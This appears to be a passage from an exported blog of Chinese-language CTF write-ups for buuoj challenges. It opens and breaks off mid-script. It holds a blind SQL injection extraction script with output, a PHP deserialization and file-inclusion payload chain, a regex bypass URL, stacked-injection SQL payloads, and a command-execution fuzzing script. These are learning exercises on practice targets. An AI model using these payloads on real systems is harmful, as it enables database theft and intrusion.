<span class="keyword">return</span> binarySearch(l, mid<span class="number">-1</span>, pos)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> binarySearch(mid+<span class="number">1</span>, r, pos) </span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># payload = "http://b4a85959-511e-47dd-a436-55d6e3773263.node3.buuoj.cn/?stunum=if(length(database())%3E2,1,0)#"</span></span><br><span class="line">    <span class="comment"># 表</span></span><br><span class="line">    <span class="comment"># select group_concat(table_name) from information_schema.tables where table_schema=database()</span></span><br><span class="line">    <span class="comment"># payload = "http://b4a85959-511e-47dd-a436-55d6e3773263.node3.buuoj.cn/?stunum=(if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;=&#123;1&#125;),1,0))#".format(i,j)</span></span><br><span class="line">    tables_str = str()</span><br><span class="line">    <span class="comment"># tables_str </span></span><br><span class="line">    <span class="keyword">for</span> flag_pos <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">128</span></span><br><span class="line">        temp = binarySearch(<span class="number">0</span>,<span class="number">128</span>,flag_pos)</span><br><span class="line">        <span class="comment"># print(temp)</span></span><br><span class="line">        </span><br><span class="line">        tables_str = tables_str + (chr(temp))</span><br><span class="line">        <span class="keyword">if</span> (temp &lt;= <span class="number">0</span>):</span><br><span class="line">            print(<span class="string">"finish"</span>)</span><br><span class="line">            print(tables_str)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        print(<span class="string">"temp &#123;0&#125;"</span>.format(tables_str))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    exp()</span><br><span class="line">    <span class="comment"># binarySearch(0,128,0)</span></span><br><span class="line">    print(<span class="string">"total time = &#123;0&#125;"</span>.format(time.time()-start_time))</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">temp f</span><br><span class="line">temp fl</span><br><span class="line">temp fla</span><br><span class="line">temp flag</span><br><span class="line">temp flag,</span><br><span class="line">temp flag,s</span><br><span class="line">temp flag,sc</span><br><span class="line">temp flag,sco</span><br><span class="line">temp flag,scor</span><br><span class="line">temp flag,score</span><br><span class="line">finish</span><br><span class="line">flag,score</span><br><span class="line">total time = 83.0339999199</span><br></pre></td></tr></table></figure>

<ul>
<li>列名</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 列名</span></span><br><span class="line">temp_data = "http://b4a85959-511e-47dd-a436-55d6e3773263.node3.buuoj.cn/?stunum=(if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),&#123;0&#125;,1))&gt;=&#123;1&#125;),1,0))#".format(pos,mid)</span><br><span class="line">  </span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">temp f</span><br><span class="line">temp fl</span><br><span class="line">temp fla</span><br><span class="line">temp flag</span><br><span class="line">temp flag,</span><br><span class="line">temp flag,v</span><br><span class="line">temp flag,va</span><br><span class="line">temp flag,val</span><br><span class="line">temp flag,valu</span><br><span class="line">temp flag,value</span><br><span class="line">finish</span><br><span class="line">flag,value</span><br><span class="line">total time = 83.3169999123</span><br></pre></td></tr></table></figure>

<ul>
<li>值</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">temp_data = "http://b4a85959-511e-47dd-a436-55d6e3773263.node3.buuoj.cn/?stunum=(if((ascii(substr((select/**/value/**/from/**/flag),&#123;0&#125;,1))&gt;=&#123;1&#125;),1,0))#".format(pos,mid)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">flag&#123;c07c1d71-d650-4d1e-80fb-18f836b660ac&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>布尔注入</tag>
      </tags>
  </entry>
  <entry>
    <title>ZJCTF2019NiZhuanSiWei</title>
    <url>/2021/03/19/blog_formal/security/CTF/ZJCTF2019NiZhuanSiWei/</url>
    <content><![CDATA[<h1 id="ZJCTF2019NiZhuanSiWei"><a href="#ZJCTF2019NiZhuanSiWei" class="headerlink" title="ZJCTF2019NiZhuanSiWei"></a>ZJCTF2019NiZhuanSiWei</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>php</code>反序列化</li>
<li><code>php</code>文件包含</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./ZJCTF2019NiZhuanSiWei/1.png" alt></p>
<ul>
<li>源码审计</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">index.php?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure>

<p><img data-src="./ZJCTF2019NiZhuanSiWei/2.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">index.php?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</span><br><span class="line"></span><br><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo "&lt;br&gt;";</span><br><span class="line">        return ("U R SO CLOSE !///COME ON PLZ");</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>构造反序列化</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Flag;</span><br><span class="line">$a -&gt; file = <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Flag</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">index.php?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="./ZJCTF2019NiZhuanSiWei/3.png" alt></p>
<p><img data-src="./ZJCTF2019NiZhuanSiWei/4.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>php反序列化</tag>
        <tag>php文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>Zer0pts2020Can you guess it?</title>
    <url>/2021/02/07/blog_formal/security/CTF/Zer0pts2020Canyouguessit/</url>
    <content><![CDATA[<h1 id="Zer0pts2020Can-you-guess-it"><a href="#Zer0pts2020Can-you-guess-it" class="headerlink" title="Zer0pts2020Can you guess it?"></a>Zer0pts2020Can you guess it?</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>正则绕过</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./Zer0pts2020Canyouguessit/1.png" alt></p>
<p><img data-src="./Zer0pts2020Canyouguessit/2.png" alt></p>
<ul>
<li>源码审计</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret &#x3D; bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#39;guess&#39;])) &#123;</span><br><span class="line">  $guess &#x3D; (string) $_POST[&#39;guess&#39;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message &#x3D; &#39;Wrong.&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">&lt;?php if (isset($message)) &#123; ?&gt;</span><br><span class="line">    &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$_SERVER[&#39;PHP_SELF&#39;]</code></li>
</ul>
<p><img data-src="./Zer0pts2020Canyouguessit/3.png" alt></p>
<ul>
<li>而浏览器的解析是</li>
</ul>
<p><img data-src="./Zer0pts2020Canyouguessit/4.png" alt></p>
<ul>
<li>所以我们传入 <code>index.php/config.php?source</code>,只需要绕过正则，就可以拿到<code>flag</code></li>
<li>正则绕过</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://xxxxxxxxxxxx/index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure>

<p><img data-src="./Zer0pts2020Canyouguessit/5.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>正则绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯2019随便注</title>
    <url>/2021/01/21/blog_formal/security/CTF/%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
    <content><![CDATA[<h1 id="强网杯2019随便注"><a href="#强网杯2019随便注" class="headerlink" title="强网杯2019随便注"></a>强网杯2019随便注</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>堆叠注入</code></li>
<li><code>show、预编译、 rename alert 、handler</code></li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页，题目提示为<code>sql</code>注入</li>
</ul>
<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/1.png" alt></p>
<ul>
<li>手动测试</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1' # 报错</span><br><span class="line">1' -- qwe # 返回正常结果</span><br><span class="line">1' and 1=2 -- qwe # 无结果</span><br><span class="line">1' and 1=1 -- qwe # 正常结果</span><br><span class="line">1' order by 2 -- qwe # 返回正常结果</span><br><span class="line">1' order by 3 -- qwe # 返回错误 列数为 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1' and 1=2 union select 1 ,2 -- qwe # 发现拦截</span><br><span class="line">return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.png" alt></p>
<ul>
<li>遇到瓶颈，过滤了一些关键字符</li>
<li>尝试堆叠注入</li>
</ul>
<p><code>1&#39; and 1=2; show databases; -- qwe</code></p>
<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/3.png" alt></p>
<p><code>1&#39; and 1=2; show tables from supersqli; -- qwe</code> or <code>1&#39; and 1=2; show tables; -- qwe</code></p>
<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1' and 1=2; show columns from `1919810931114514`; -- qwe</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/5.png" alt></p>
<ul>
<li><code>flag</code>的位置在<code>supersqli -&gt; 1919810931114514 -&gt; flag</code></li>
</ul>
<hr>
<p>读取flag姿势</p>
<ul>
<li>通过<code>handler</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开一张表，无返回结果，实际上声明了一个名为tb1_name的句柄。</span></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</span></span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"><span class="meta">#</span><span class="bash"> 关闭打开的句柄。</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1' and 1=2; handler `1919810931114514` open; handler `1919810931114514` read first; -- qwe</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png" alt></p>
<ul>
<li>通过预编译语句</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SET;									# 用于设置变量名和值</span><br><span class="line">PREPARE stmt_name FROM preparable_stmt;	# 用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">EXECUTE stmt_name;			 			# 执行语句</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;	# 用来释放掉预处理的语句</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1' and 1=2; SET @test1 = concat('se', 'lect * from `1919810931114514`;'); PREPARE stmt_name1 FROM @test1; EXECUTE stmt_name1; -- qwe</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/7.png" alt></p>
<ul>
<li>通过变换表明</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1' and 1=2; show columns from `words`; -- qwe</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/8.png" alt></p>
<p>可以把 <code>word</code>命名成<code>word1</code>,将<code>1919810931114514</code>命名为<code>word</code></p>
<p>并且将<code>1919810931114514</code> 中的<code>flag</code>列命名为<code>id</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1' and 1=2; rename table `words` to `words1`; rename table `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100); -- qwe</span><br></pre></td></tr></table></figure>

<p>之后执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1' or 1=1 -- qwe</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/9.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯2019高明的黑客</title>
    <url>/2021/01/22/blog_formal/security/CTF/%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="强网杯2019高明的黑客"><a href="#强网杯2019高明的黑客" class="headerlink" title="强网杯2019高明的黑客"></a>强网杯2019高明的黑客</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>fuzz</code>测试</li>
<li><code>python</code>并发</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/1.png" alt></p>
<ul>
<li>下载源码，进行审计</li>
</ul>
<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/2.png" alt></p>
<p>发现代码做了混淆</p>
<ul>
<li>写脚本进行<code>fuzz</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">r"C:/phpStudy/WWW/gm/"</span></span><br><span class="line">file_list = os.listdir(file_path)</span><br><span class="line">pre_url = <span class="string">r"http://127.0.0.1/gm/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_par</span><span class="params">(file_name)</span>:</span></span><br><span class="line">    <span class="comment"># 获取传参</span></span><br><span class="line">    begin_time = time.time()</span><br><span class="line">    get_set = set()</span><br><span class="line">    post_set = set()</span><br><span class="line">    <span class="keyword">with</span> open(file_path+file_name, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            res_obj = re.search(<span class="string">r"\$_GET\[.*\]"</span>, line)</span><br><span class="line">            <span class="keyword">if</span> res_obj:</span><br><span class="line">                <span class="comment"># print(res_obj.group()[7:-2])</span></span><br><span class="line">                <span class="comment"># print(line)</span></span><br><span class="line">                get_set.add(res_obj.group()[<span class="number">7</span>:<span class="number">-2</span>])</span><br><span class="line"></span><br><span class="line">            res_obj = re.search(<span class="string">r"\$_POST\[.*\]"</span>, line)</span><br><span class="line">            <span class="keyword">if</span> res_obj:</span><br><span class="line">                <span class="comment"># print(res_obj.group()[8:-2])</span></span><br><span class="line">                <span class="comment"># print(line)</span></span><br><span class="line">                post_set.add(res_obj.group()[<span class="number">8</span>:<span class="number">-2</span>])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"&#123;0&#125; get par total time = &#123;1&#125;"</span>.format(file_name, time.time()-begin_time))</span><br><span class="line">    <span class="keyword">return</span> get_set, post_set</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(file_name)</span>:</span></span><br><span class="line">    <span class="comment"># print("1111")</span></span><br><span class="line">    get_set, post_set = get_par(file_name)</span><br><span class="line">    begin_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> get_set:</span><br><span class="line">        temp_url = pre_url + file_name</span><br><span class="line">        kw = &#123;i:<span class="string">'echo "4396haoxinshimin"'</span>&#125;</span><br><span class="line">        response = requests.get(temp_url, params = kw)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"4396haoxinshimin"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">            print(<span class="string">"ok"</span>)</span><br><span class="line">            print(<span class="string">"url = &#123;0&#125; params = &#123;1&#125;"</span>.format(temp_url, kw))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment"># print(kw)</span></span><br><span class="line">            <span class="comment"># print("123")</span></span><br><span class="line">    print(<span class="string">"&#123;0&#125; exp get total time = &#123;1&#125;"</span>.format(file_name, time.time()-begin_time))</span><br><span class="line">    begin_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> post_set:</span><br><span class="line">        temp_url = pre_url + file_name</span><br><span class="line">        kw = &#123;i:<span class="string">'echo "4396haoxinshimin"'</span>&#125;</span><br><span class="line">        response = requests.post(temp_url, data = kw)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"4396haoxinshimin"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">            print(<span class="string">"ok 111"</span>)</span><br><span class="line">            print(<span class="string">"url = &#123;0&#125; data = &#123;1&#125;"</span>.format(temp_url, kw))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"&#123;0&#125; exp post total time = &#123;1&#125;"</span>.format(file_name, time.time()-begin_time))</span><br><span class="line">    print(<span class="string">"&#123;0&#125; end exp"</span>.format(file_name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    exp(<span class="string">'xk0SzyKwfzw.php'</span>)</span><br><span class="line">    exp(<span class="string">'XJGJA7EIFb5.php'</span>)</span><br><span class="line">    exp(<span class="string">'xkDOw47BVCk.php'</span>)</span><br><span class="line">    <span class="comment"># print(file_list)</span></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="comment"># pool = Pool(processes = 30)</span></span><br><span class="line">    <span class="comment"># # print(file_list[5])</span></span><br><span class="line">    <span class="comment"># for i in range(len(file_list)):</span></span><br><span class="line">    <span class="comment">#     # print(i)</span></span><br><span class="line">    <span class="comment">#     pool.apply_async(exp,args=[file_list[i]])</span></span><br><span class="line">    <span class="comment">#     # print(file_list[i])</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># pool.close()</span></span><br><span class="line">    <span class="comment"># pool.join()</span></span><br><span class="line">    </span><br><span class="line">    print(<span class="string">"total time = &#123;0&#125;"</span>.format(time.time()-start_time))</span><br><span class="line">    <span class="comment"># s = set()</span></span><br><span class="line">    <span class="comment"># s.add(1)</span></span><br><span class="line">    <span class="comment"># s.add(1)</span></span><br><span class="line">    <span class="comment"># s.add(2)</span></span><br><span class="line">    <span class="comment"># print(s)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>改进一波</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> grequests</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">r"C:/phpStudy/WWW/gm/"</span></span><br><span class="line">file_list = os.listdir(file_path)</span><br><span class="line">pre_url = <span class="string">r"http://127.0.0.1/gm/"</span></span><br><span class="line">g_res = list()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_par</span><span class="params">(file_name)</span>:</span></span><br><span class="line">    <span class="comment"># 获取传参</span></span><br><span class="line">    begin_time = time.time()</span><br><span class="line">    get_set = set()</span><br><span class="line">    post_set = set()</span><br><span class="line">    <span class="keyword">with</span> open(file_path+file_name, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            res_obj = re.search(<span class="string">r"\$_GET\[.*\]"</span>, line)</span><br><span class="line">            <span class="keyword">if</span> res_obj:</span><br><span class="line">                <span 